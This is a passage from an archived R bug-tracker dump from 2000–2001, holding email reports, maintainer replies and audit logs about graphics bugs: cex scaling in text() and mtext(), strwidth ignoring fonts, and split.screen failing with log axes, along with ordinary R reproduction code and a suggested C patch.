 par(cex=2); plot(1:10); text(4, 5, "Hello World", cex = 0.5)

So the scaling with cex in text() is relative to the par() settings,
which is not the expected behaviour.


[R-1.2.2 on WinNT 4.0]

Uwe Ligges

==> 660.followup.2 <==
From ripley@stats.ox.ac.uk  Wed Apr 25 20:00:09 2001
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA03187
	for <R-bugs@biostat.ku.dk>; Wed, 25 Apr 2001 20:00:09 +0200 (MET DST)
Received: from max166.public.ox.ac.uk (max166.public.ox.ac.uk [192.76.27.166])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id SAA06061;
	Wed, 25 Apr 2001 18:56:30 +0100 (BST)
Date: Wed, 25 Apr 2001 18:55:47 +0100 (GMT Daylight Time)
From: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
To: <ligges@statistik.uni-dortmund.de>
cc: <r-devel@stat.math.ethz.ch>, <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] Re: identify.default ignores any setting of cex (PR#660)
In-Reply-To: <200104251524.RAA02124@pubhealth.ku.dk>
Message-ID: <Pine.WNT.4.31.0104251852500.300-100000@tern.stats>
Sender: ripley@stats.ox.ac.uk
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Wed, 25 Apr 2001 ligges@statistik.uni-dortmund.de wrote:

> A follow-up to PR#660 (15 Sep 2000) from Brian Ripley:

[...]

> The same with
>
>  par(cex=1); plot(1:10); text(4, 5, "Hello World") # OK
>  par(cex=2); plot(1:10); text(4, 5, "Hello World") # OK
>  par(cex=2); plot(1:10); text(4, 5, "Hello World", cex = 1) # NOT OK
>  par(cex=2); plot(1:10); text(4, 5, "Hello World", cex = 0.5)
>
> So the scaling with cex in text() is relative to the par() settings,
> which is not the expected behaviour.

It is the documented behaviour, though: see the description of cex in
?help.

     cex: numeric character expansion factor; multiplied by
          `par("cex")' yields the final character size.

Brian

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 776 *
Subject: strwidth does not take font into account
From: Martyn Plummer <plummer@iarc.fr>
Date: Tue, 19 Dec 2000 14:56:01 +0100 (CET)
--This needs a substantial redesign.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 776 <==
From postmaster@franz.stat.wisc.edu  Tue Dec 19 14:53:40 2000
Received: from franz.stat.wisc.edu (franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA05819
	for <r-bugs@biostat.ku.dk>; Tue, 19 Dec 2000 14:53:39 +0100 (MET)
Received: from smtp02.iarc.fr (really [212.157.236.234]) by franz.stat.wisc.edu
	via in.smtpd with esmtp
	id <m148NHG-000IYiC@franz.stat.wisc.edu> (Debian Smail3.2.0.102)
	for <r-bugs@r-project.org>; Tue, 19 Dec 2000 07:58:02 -0600 (CST) 
Received: from xena.iarc.fr ([10.10.150.125])
	by smtp02.iarc.fr (8.9.3/8.9.3) with ESMTP id OAA21720
	for <r-bugs@r-project.org>; Tue, 19 Dec 2000 14:53:55 +0100
Message-ID: <XFMail.001219145601.plummer@iarc.fr>
X-Mailer: XFMail 1.3 [p0] on Linux
X-Priority: 3 (Normal)
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 8bit
MIME-Version: 1.0
Date: Tue, 19 Dec 2000 14:56:01 +0100 (CET)
Organization: International Agency for Research on Cancer
Sender: martyn@xena.iarc.fr
From: Martyn Plummer <plummer@iarc.fr>
To: r-bugs@r-project.org
Subject: strwidth does not take font into account

One for the wishlist.

The text() function permits the use of different fonts with the arguments
"font" or "vfont".  These create text strings of the same height as the
default font, but of different widths: bold face is slightly wider; vector
fonts are usually much wider.  I think the strwidth() function needs to
take the font into account by also having "font" and "vfont" arguments.
Currently it reports the string width using the default font, which can
be quite different.

Here is a little test function you can use to see how far off the
reported string width is.

test.strwidth <-
function(text, vfont=NULL, cex=NULL, ...)
{
 plot(0,0,xlim=c(-1,1),ylim=c(-1,1), type="n")
 text(0,0, text, adj=c(0,0), offset=0, cex=cex, vfont=vfont, ...)
 abline(h=c(0, strheight(text, cex=cex)), lty=2)
 abline(v=c(0, strwidth(text, cex=cex)), lty=2)
}

e.g.

test.strwidth("This is some text", cex=2)
test.strwidth("This is some text", cex=2, font=2)
test.strwidth("This is some text", vfont=c("sans serif", "plain"))

Martyn

Please do not edit the information below--

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status =
 major = 1
 minor = 2.0
 year = 2000
 month = 12
 day = 15
 language = R

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base




==> 776.audit <==
Tue Dec 26 10:31:10 2000	ripley	moved from incoming to Graphics
Sat Feb 24 08:55:28 2001	ripley	changed notes
Sat Feb 24 08:55:28 2001	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 791 *
Subject:  par(lab= *) / axis(*) bug 
From: maechler@stat.math.ethz.ch
Date: Fri, 22 Dec 2000 10:59:26 +0100
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 791 <==
From postmaster@franz.stat.wisc.edu  Fri Dec 22 10:59:23 2000
Received: from franz.stat.wisc.edu (franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id KAA08619
	for <r-bugs@biostat.ku.dk>; Fri, 22 Dec 2000 10:59:23 +0100 (MET)
Received: from stat.math.ethz.ch (really [129.132.58.23]) by franz.stat.wisc.edu
	via in.smtpd with esmtp (ident daemon using rfc1413)
	id <m149OzA-000IXMC@franz.stat.wisc.edu> (Debian Smail3.2.0.102)
	for <r-bugs@r-project.org>; Fri, 22 Dec 2000 03:59:36 -0600 (CST) 
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id KAA02617;
	Fri, 22 Dec 2000 10:59:34 +0100 (MET)
Received: from UNKNOWN(129.132.58.33), claiming to be "florence.ethz.ch"
 via SMTP by hypatia, id smtpdAAAa000cp; Fri Dec 22 10:59:26 2000
Received: (maechler@localhost) by florence.ethz.ch (8.9.3/D-MATH-client) id KAA23075; Fri, 22 Dec 2000 10:59:26 +0100
Date: Fri, 22 Dec 2000 10:59:26 +0100
From: maechler@stat.math.ethz.ch
Message-Id: <200012220959.KAA23075@florence.ethz.ch>
To: r-bugs@r-project.org
Subject:  par(lab= *) / axis(*) bug 
Cc: maechler@stat.math.ethz.ch

As the subject says,
here is example code (with comments) showing the problem:

p1 <- function(lab = c(8,12,7))
{
    ## This `fails' (on a virgin device)
    clab <- paste(lab,collapse=",")
    plot(1,1, xlim = c(0,15), ylim = c(-.8,1), type ="n", axes = FALSE,
         main=paste("plot(*,axes=F); par(lab= c(",clab,"));  axis(*) x 2",sep=""))
    box(col="gray80")
    op <- par(lab = lab) ; on.exit(par(op))
    axis(1, pos = 0)
    axis(2, pos = 0, las = 1)
    par(op)
    op
}

p2 <- function(lab = c(8,12,7))
{
    ## This works  [par()  *BEFORE*  plot() ]
    clab <- paste(lab,collapse=",")
    op <- par(lab = lab) ; on.exit(par(op))

    plot(1,1, xlim = c(0,15), ylim = c(-.8,1), type ="n", axes = FALSE,
         main=paste("par(lab= c(",clab,")); plot(*,axes=F); axis(*) x 2",sep=""))
    box(col="gray80")
    axis(1, pos = 0)
    axis(2, pos = 0, las = 1)
    op ## lab 5 5 7
}

dev.off()
par(mfrow=c(2,1), mar=c(2,2,3,1))
p1()
p2()




--please do not edit the information below--

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status = Patched
 major = 1
 minor = 2.0
 year = 2000
 month = 12
 day = 19
 language = R

Search Path:
 .GlobalEnv, package:nls, package:splines, package:lqs, package:modreg, package:stepfun, package:mva, package:eda, package:ts, package:VLMC, package:ctest, package:SfS, Autoloads, package:base

==> 791.audit <==
Tue Dec 26 10:31:10 2000	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 816 *
Subject: dotplot: character size of labels
From: RINNER Heinrich <H.RINNER@TIROL.GV.AT>
Date: Thu, 18 Jan 2001 14:54:32 +0100
--Suggested fix is incorporated in 1.2.2.
--
--There is a deeper problem:  mtext() ignores par(cex=.5) in general.  
--To see the problem try:  par(cex=.5); mtext("hi")
--Paul thinks the right fix is to change the argument list for mtext so that
--cex=par(cex) by default rather than cex=NA by default (plus corresponding
--internal changes to  do_mtext in plot.c).
--This needs to be done very carefully because (i) the change suggested above 
--mayhave side-effects in many other pieces of interpreted code 
--(ii) do_mtext ignores dd->gp.cexbase unlike, for example, do_plot_xy 
--and anything to do with cexbase needs extreme care.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 816 <==
From postmaster@franz.stat.wisc.edu  Thu Jan 18 16:57:16 2001
Received: from franz.stat.wisc.edu (franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA13627
	for <r-bugs@biostat.ku.dk>; Thu, 18 Jan 2001 16:57:15 +0100 (MET)
Received: from ingw1.tirol.gv.at (really [212.183.27.1]) by franz.stat.wisc.edu
	via in.smtpd with esmtp
	id <m14JHRE-000IWyC@franz.stat.wisc.edu> (Debian Smail3.2.0.102)
	for <r-bugs@r-project.org>; Thu, 18 Jan 2001 09:57:24 -0600 (CST) 
Received: from xms.tirol.gv.at (xms.tirol.gv.at [10.11.128.200])
	by ingw1.tirol.gv.at (Mailer) with ESMTP id 22ADE2825
	for <r-bugs@r-project.org>; Thu, 18 Jan 2001 14:49:47 +0100 (NFT)
Received: from xms.tirol.gv.at (unverified) by xms.tirol.gv.at
 (Content Technologies SMTPRS 4.1.5) with ESMTP id <T0a0b80c8512ecf1400@xms.tirol.gv.at> for <r-bugs@r-project.org>;
 Thu, 18 Jan 2001 14:54:33 +0100
Received: by xms.tirol.gv.at with Internet Mail Service (5.5.2650.21)
	id <CLGLQ6B7>; Thu, 18 Jan 2001 14:54:33 +0100
Message-ID: <C4D44AB4CB62D311BA6500041202E8862640F8@xms1.tirol.gv.at>
From: RINNER Heinrich <H.RINNER@TIROL.GV.AT>
To: "'r-bugs@r-project.org'" <r-bugs@r-project.org>
Subject: dotplot: character size of labels
Date: Thu, 18 Jan 2001 14:54:32 +0100
Return-Receipt-To: RINNER Heinrich <H.RINNER@TIROL.GV.AT>
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2650.21)
Content-Type: text/plain;
	charset="iso-8859-1"
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by pubhealth.ku.dk id QAA13627

There seems to be a bug in "dotplot" concerning the "cex" parameter. Setting
cex has no effect on the character size of the labels of the points.
This problem was posted to r-help today (Thu, 18 Jan 2001); the solution
given by Brian Ripley (and Uwe Ligges) seems to work for me.

Heinrich Rinner.
 
> version
         _              
platform i386-pc-mingw32
arch     x86            
os       Win32          
system   x86, Win32     
status                  
major    1              
minor    2.0            
year     2000           
month    12             
day      15             
language R              

> ----------
> Von: 	Prof Brian Ripley[SMTP:ripley@stats.ox.ac.uk]
> Gesendet: 	Donnerstag, 18. Jänner 2001 10:35
> An: 	RINNER Heinrich
> Cc: 	'r-help@stat.math.ethz.ch'
> Betreff: 	Re: [R] dotplot: character size of labels
> 
> On Thu, 18 Jan 2001, RINNER Heinrich wrote:
> 
> > Dear R users,
> >
> > using dotplot (R1.2.0, WinNT4.0), I am trying to change the character
> size
> > of the labels of the points:
> >
> > > # example
> > > data(VADeaths)
> > > dotplot(VADeaths, main = "Death Rates in Virginia - 1940")
> > > # I'd like to have smaller character size of the labels (for age and
> > population groups)
> > > ?dotplot
> > > # for argument "cex", this says: "Setting cex to a value smaller than
> one
> > can be a useful way of avoiding label overlap."
> > > dotplot(VADeaths, main = "Death Rates in Virginia - 1940", cex = 0.5)
> > > # the main title and the plotting characters are smaller now, but not
> the
> > labels
> > > # trying to set other graphics parameters seems to have no effect:
> > > dotplot(VADeaths, main = "Death Rates in Virginia - 1940", cex.axis =
> 0.5)
> > > dotplot(VADeaths, main = "Death Rates in Virginia - 1940", cex.lab =
> 0.5)
> >
> > I'd be grateful for any hint how to do this correctly;
> 
> Looks like a bug. Inside dotplot alter to
> 
>         for (i in 1:n) mtext(labs[i], side = 2, line = loffset,
>             at = y[i], adj = 0, col = color, las = 2, cex = cex, ...)
> 
>         for (i in 1:nlevels(groups)) mtext(glabels[i], side = 2,
>             line = goffset, at = gpos[i], adj = 0, col = gcolor,
>             las = 2, cex = cex, ...)
> 
> However, it really needs more than that to calculate the spaces for the
> labels correctly.
> 
> 
> -- 
> Brian D. Ripley,                  ripley@stats.ox.ac.uk
> Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
> University of Oxford,             Tel:  +44 1865 272861 (self)
> 1 South Parks Road,                     +44 1865 272860 (secr)
> Oxford OX1 3TG, UK                Fax:  +44 1865 272595
> 

==> 816.audit <==
Sat Jan 20 10:24:14 2001	ripley	moved from incoming to Graphics
Tue Jan 23 03:38:23 2001	paul	changed notes
Tue Jan 23 03:38:23 2001	paul	foobar
Sun Feb 18 10:11:12 2001	ripley	changed notes
Sun Feb 18 10:11:12 2001	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 820 *
Subject: interaction.plot
From: "Mark M. Span" <span@psy.uva.nl>
Date: Mon, 22 Jan 2001 10:47:39 +0100
--mtext is unscaled by default.  It is not clear if this should
--use the par("cex") setting or an inline cex setting such as cex.axis.
--It might make more sense to use axis rather than mtext, as boxplot does.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 820 <==
From postmaster@franz.stat.wisc.edu  Mon Jan 22 10:43:38 2001
Received: from franz.stat.wisc.edu (franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id KAA09043
	for <r-bugs@biostat.ku.dk>; Mon, 22 Jan 2001 10:43:37 +0100 (MET)
Received: from mail.psy.uva.nl (really [145.18.113.16]) by franz.stat.wisc.edu
	via in.smtpd with esmtp
	id <m14KdVr-000IWyC@franz.stat.wisc.edu> (Debian Smail3.2.0.102)
	for <r-bugs@r-project.org>; Mon, 22 Jan 2001 03:43:47 -0600 (CST) 
Received: from rea2205 (rea2205.psy.uva.nl [145.18.152.205])
	by mail.psy.uva.nl (8.9.3/8.9.3) with SMTP id KAA21513
	for <r-bugs@r-project.org>; Mon, 22 Jan 2001 10:43:45 +0100 (MET)
Message-ID: <008501c08458$5bfc6530$cd981291@psy.uva.nl>
From: "Mark M. Span" <span@psy.uva.nl>
To: <r-bugs@r-project.org>
Subject: interaction.plot
Date: Mon, 22 Jan 2001 10:47:39 +0100
Organization: UvA
MIME-Version: 1.0
Content-Type: text/plain;
	charset="iso-8859-1"
Content-Transfer-Encoding: 7bit
X-Priority: 3
X-MSMail-Priority: Normal
X-Mailer: Microsoft Outlook Express 5.50.4133.2400
X-MimeOLE: Produced By Microsoft MimeOLE V5.50.4133.2400

I notices some indesireable behaviour in interaction.plot. The scaling of
the x-axis labels discards the overall settings for the 'cex' attribute,
leading to unscaled labels. The source for this behaviour is the line

mtext(xlabs, 1, at = xvals)

in interaction.plot.

to get this function to perform conform the manual, change this line to

mtext(xlabs, 1, at = xvals, cex=par("cex"))

and all is well.

because of the simplicity of this 'fix' I assume that it is a crossplatform
thingie, but for the record:

I use R-Win in winNT, 1.2.0, upgrading soon.

just my .02 euro..

I'll just end this mail with a standard declaration of love for R

greetz. Mark M. Span


==> 820.audit <==
Thu Jan 25 00:05:53 2001	ripley	moved from incoming to Graphics
Sat Feb 24 08:53:40 2001	ripley	changed notes
Sat Feb 24 08:53:40 2001	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 831 *
Subject: screen can't go back to (split) screen with log="y" plot
From: Thomas Vogels <tov@ece.cmu.edu>
Date: 30 Jan 2001 00:39:41 -0500
--Still there. Suggested fix included in followups, but we didn't get around to
--try it in time for 1.2.3.
--
--Fix doesn't work. One problem is that the opar<-par();par(opar) idiom updates
--xaxp before xlog, and the new value of xaxp may only be valid under the new
--value of xlog.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 831 <==
From postmaster@franz.stat.wisc.edu  Tue Jan 30 06:39:31 2001
Received: from franz.stat.wisc.edu (franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id GAA28455
	for <r-bugs@biostat.ku.dk>; Tue, 30 Jan 2001 06:39:30 +0100 (MET)
Received: from infiniti.ece.cmu.edu (really [128.2.216.84]) by franz.stat.wisc.edu
	via in.smtpd with esmtp
	id <m14NTW2-000IWyC@franz.stat.wisc.edu> (Debian Smail3.2.0.102)
	for <r-bugs@r-project.org>; Mon, 29 Jan 2001 23:39:42 -0600 (CST) 
Received: (from tov@localhost) by infiniti.ece.cmu.edu (AIX4.3/UCB 8.8.8/8.8.8) id AAA26672; Tue, 30 Jan 2001 00:39:42 -0500
X-Authentication-Warning: infiniti.ece.cmu.edu: tov set sender to tov@ece.cmu.edu using -f
Sender: tov@infiniti.ece.cmu.edu
To: r-bugs@r-project.org
Cc: Thomas Vogels <tov@ece.cmu.edu>
Subject: screen can't go back to (split) screen with log="y" plot
Reply-To: Thomas Vogels <tov@ece.cmu.edu>
X-URI: http://www.ece.cmu.edu/~tov
From: Thomas Vogels <tov@ece.cmu.edu>
User-Agent: Gnus/5.0807 (Gnus v5.8.7) Emacs/20.7
Date: 30 Jan 2001 00:39:41 -0500
Message-ID: <pxsnm1egyq.fsf@infiniti.ece.cmu.edu>
Lines: 76
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii


Hi.  Let's try to explain the subject line with some code:

> split.screen (c(2,1))
[1] 1 2
> screen(1)
> plot (1:2, 1:2, log="y", main="1")
> screen (2)
> plot (1:2, 1:2, main="2")
> screen (1)
Error in par(.split.screens[[n]]) : invalid value specified for graphics parameter "yaxp".
> close.screen(all=TRUE)

Let's add comments:

> split.screen (c(2,1))
[1] 1 2

OK, plot in the top half screen:
> screen(1)
> plot (1:2, 1:2, log="y", main="1")
> par("yaxp")
[1]  1  2 -5

OK, switch to bottom half:
> screen (2)
> plot (1:2, 1:2, main="2")
> par("yaxp")
[1] 1 2 5

OK, looks fine, let's go back up:
> screen (1)
Error in par(.split.screens[[n]]) : invalid value specified for graphics parameter "yaxp".

Bummer.
> close.screen(all=TRUE)

Somehow I'm hoping you'll tell me I'm doing something wrong, because
I'd really would like to be able to do the following:
  repeat {
    #calculate
    screen(1)
    #fancy plot
    screen (2)
    #even fancier plot ;-)
    if (user.bored()) break
  }
Which is roughly what I was doing when the error messages started
popping up.

Thanks,
  -tom

--please do not edit the information below--

Version:
 platform = i386-pc-linux-gnu
 arch = i386
 os = linux-gnu
 system = i386, linux-gnu
 status = 
 major = 1
 minor = 2.1
 year = 2001
 month = 01
 day = 15
 language = R

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base



-- 
mailto:tov@ece.cmu.edu (Tom Vogels)   Tel: (412) 268-6638   FAX: -3204


==> 831.followup.1 <==
From ripley@stats.ox.ac.uk  Tue Jan 30 08:40:46 2001
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id IAA28901
	for <R-bugs@biostat.ku.dk>; Tue, 30 Jan 2001 08:40:46 +0100 (MET)
Received: from max144.public.ox.ac.uk (max144.public.ox.ac.uk [192.76.27.144])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id HAA21509;
	Tue, 30 Jan 2001 07:40:54 GMT
Date: Tue, 30 Jan 2001 07:39:25 +0000 (GMT)
From: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
Sender: <ripley@auk.stats>
To: <tov@ece.cmu.edu>
cc: <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] screen can't go back to log="y" plot (PR#831)
In-Reply-To: <200101300539.GAA28465@pubhealth.ku.dk>
Message-ID: <Pine.GSO.4.31.0101300725290.17104-100000@auk.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

[I have abbreviated the subject as jitterbug has been having probems
with long subjects.]

The issue here is that one cannot mix log/non-log axes in the calls to
screen(), as the appropriate par() parameter is read-only, but the
meaning of yaxp depends on it.  But beyond that you can't set
x/yaxp for log axes.

You should be able to do this: you can in the S original.

A simpler version:

plot (1:2, 1:2, log="y", main="1")
zz <- par("yaxp")
zz
[1]  1  2 -5
par(yaxp=zz)
Error in par(yaxp = zz) : invalid value specified for graphics parameter
"yaxp".

So you can't reset the yaxp parameter to what it is reported as!


Additional bug: the meaning of x/yaxp for log axes is not defined
in help(par).


On Tue, 30 Jan 2001 tov@ece.cmu.edu wrote:

>
> Hi.  Let's try to explain the subject line with some code:
>
> > split.screen (c(2,1))
> [1] 1 2
> > screen(1)
> > plot (1:2, 1:2, log="y", main="1")
> > screen (2)
> > plot (1:2, 1:2, main="2")
> > screen (1)
> Error in par(.split.screens[[n]]) : invalid value specified for graphics parameter "yaxp".
> > close.screen(all=TRUE)
>
> Let's add comments:
>
> > split.screen (c(2,1))
> [1] 1 2
>
> OK, plot in the top half screen:
> > screen(1)
> > plot (1:2, 1:2, log="y", main="1")
> > par("yaxp")
> [1]  1  2 -5
>
> OK, switch to bottom half:
> > screen (2)
> > plot (1:2, 1:2, main="2")
> > par("yaxp")
> [1] 1 2 5
>
> OK, looks fine, let's go back up:
> > screen (1)
> Error in par(.split.screens[[n]]) : invalid value specified for graphics parameter "yaxp".
>
> Bummer.
> > close.screen(all=TRUE)
>
> Somehow I'm hoping you'll tell me I'm doing something wrong, because
> I'd really would like to be able to do the following:
>   repeat {
>     #calculate
>     screen(1)
>     #fancy plot
>     screen (2)
>     #even fancier plot ;-)
>     if (user.bored()) break
>   }
> Which is roughly what I was doing when the error messages started
> popping up.
>
> Thanks,
>   -tom
>
> --please do not edit the information below--
>
> Version:
>  platform = i386-pc-linux-gnu
>  arch = i386
>  os = linux-gnu
>  system = i386, linux-gnu
>  status =
>  major = 1
>  minor = 2.1
>  year = 2001
>  month = 01
>  day = 15
>  language = R
>
> Search Path:
>  .GlobalEnv, package:ctest, Autoloads, package:base
>
>
>
> --
> mailto:tov@ece.cmu.edu (Tom Vogels)   Tel: (412) 268-6638   FAX: -3204
>
>
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 831.followup.2 <==
From tov@ece.cmu.edu  Thu Feb  1 02:13:08 2001
Received: from infiniti.ece.cmu.edu (INFINITI.ECE.CMU.EDU [128.2.133.84])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id CAA25173
	for <R-bugs@biostat.ku.dk>; Thu, 1 Feb 2001 02:13:07 +0100 (MET)
Received: (from tov@localhost) by infiniti.ece.cmu.edu (AIX4.3/UCB 8.8.8/8.8.8) id UAA19026; Wed, 31 Jan 2001 20:12:41 -0500
X-Authentication-Warning: infiniti.ece.cmu.edu: tov set sender to tov@ece.cmu.edu using -f
Sender: tov@infiniti.ece.cmu.edu
To: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
Cc: <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] screen can't go back to log="y" plot (PR#831)
References: <Pine.GSO.4.31.0101300725290.17104-100000@auk.stats>
Reply-To: Thomas Vogels <tov@ece.cmu.edu>
X-URI: http://www.ece.cmu.edu/~tov
From: Thomas Vogels <tov@ece.cmu.edu>
Date: 31 Jan 2001 20:12:41 -0500
In-Reply-To: Prof Brian D Ripley's message of "Tue, 30 Jan 2001 07:39:25 +0000 (GMT)"
Message-ID: <px7l3bcik6.fsf@infiniti.ece.cmu.edu>
Lines: 81
User-Agent: Gnus/5.0807 (Gnus v5.8.7) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii


Prof Brian D Ripley <ripley@stats.ox.ac.uk> writes:

> [I have abbreviated the subject as jitterbug has been having probems
> with long subjects.]
> 
> The issue here is that one cannot mix log/non-log axes in the calls to
> screen(), as the appropriate par() parameter is read-only, but the
> meaning of yaxp depends on it.  But beyond that you can't set
> x/yaxp for log axes.
> 
> You should be able to do this: you can in the S original.
> 
> A simpler version:
> 
> plot (1:2, 1:2, log="y", main="1")
> zz <- par("yaxp")
> zz
> [1]  1  2 -5
> par(yaxp=zz)
> Error in par(yaxp = zz) : invalid value specified for graphics parameter
> "yaxp".
> 
> So you can't reset the yaxp parameter to what it is reported as!
[snip]

The code in main/par.c ignores the value of xlog (or ylog) when
setting xaxp (or yaxp).  Right now you have in Specify (and Specify2):

... else if (streql(what, "xaxp")) {
	value = coerceVector(value, REALSXP);
	lengthCheck(what, value, 3);
	naRealCheck(REAL(value)[0], what);
	naRealCheck(REAL(value)[1], what);
        posIntCheck((int) (REAL(value)[2]), what);

Shouldn't that be something like:

... else if (streql(what, "xaxp")) {
	value = coerceVector(value, REALSXP);
	lengthCheck(what, value, 3);
	naRealCheck(REAL(value)[0], what);
	naRealCheck(REAL(value)[1], what);
        if (dd->gp.xlog)
            logAxpCheck((int) (REAL(value)[2]), what);
        else
            posIntCheck((int) (REAL(value)[2]), what);

Where logAxpCheck is suitably defined as:

static void logAxpCheck(int x, char *s)
{
    if (x == NA_INTEGER || x == 0 || x > 4)
	par_error(s);
}

since only values < 0 or the values 1, 2, 3 are allowed?


> Additional bug: the meaning of x/yaxp for log axes is not defined
> in help(par).

excerpt from help(par):

    xaxp: A vector of the form `c(x1, x2, n)' giving the coordinates
          of the extreme tick marks and the number of intervals
          between tick-marks.

Could you add:

          The value of n must be positive for linear scale axes.  For
          logarithmic scale axes n must be either negative (then there
          will be (1-n) ticks at a linear distance) or one of 1, 2, or
          3 where n then indicates the number of ticks per decade.

similar for yaxp?  What am I missing?
Regards,
  -tom

-- 
mailto:tov@ece.cmu.edu (Tom Vogels)   Tel: (412) 268-6638   FAX: -3204

==> 831.audit <==
Wed Feb  7 08:51:14 2001	ripley	moved from incoming to Graphics
Thu Apr 26 12:13:40 2001	pd	changed notes
Thu Apr 26 12:13:40 2001	pd	foobar
Thu Jun  7 19:13:15 2001	thomas	changed notes
Thu Jun  7 19:13:15 2001	thomas	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 837 *
Subject: screen doesn't handle redrawing properly
From: Thomas Vogels <tov@ece.cmu.edu>
Date: 01 Feb 2001 14:20:52 -0500
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 837 <==
From tov@ece.cmu.edu  Thu Feb  1 20:20:40 2001
Received: from infiniti.ece.cmu.edu (INFINITI.ECE.CMU.EDU [128.2.133.84])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA08721
	for <r-bugs@biostat.ku.dk>; Thu, 1 Feb 2001 20:20:39 +0100 (MET)
Received: (from tov@localhost) by infiniti.ece.cmu.edu (AIX4.3/UCB 8.8.8/8.8.8) id OAA30464; Thu, 1 Feb 2001 14:20:52 -0500
X-Authentication-Warning: infiniti.ece.cmu.edu: tov set sender to tov@ece.cmu.edu using -f
Sender: tov@infiniti.ece.cmu.edu
To: r-bugs@biostat.ku.dk
Cc: Thomas Vogels <tov@ece.cmu.edu>
Subject: screen doesn't handle redrawing properly
Reply-To: Thomas Vogels <tov@ece.cmu.edu>
X-URI: http://www.ece.cmu.edu/~tov
From: Thomas Vogels <tov@ece.cmu.edu>
Date: 01 Feb 2001 14:20:52 -0500
Message-ID: <pxitmub46j.fsf@infiniti.ece.cmu.edu>
Lines: 74
User-Agent: Gnus/5.0807 (Gnus v5.8.7) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii


Hi.  As far as I understand it, there is a list of graphic primitives
stored for a device.  So for example, when I iconify/deiconify an X11
window, the plot will be redrawn.  Now screen (split.screen and
friends) appear not to handle this list properly, the list is reset or
not reset at odd times.  The commands below will show clearly what I
mean.  There are two effects:

  - After splitting the device real estate into two screens, I can
    plot on these screens, alternating between them.  When I then
    touch the window to force a redraw, *all* the plots are redrawn,
    not just the last (and visible) ones.
    [This happens when the X server runs on AIX, R runs on AIX or Sun.]

  - Again, after splitting, plotting on one screen can affect the
    other screen.  I.e. plot(...); plot (...) on the left screen can
    erase the *right* screen.
    [This happens for all platforms I have access to, AIX, Linux, Sun.]

The first effect may be due to a bad interaction with the X server,
but the second effect is surely not desirable, is it?  Am I mis-using
'screen' here?

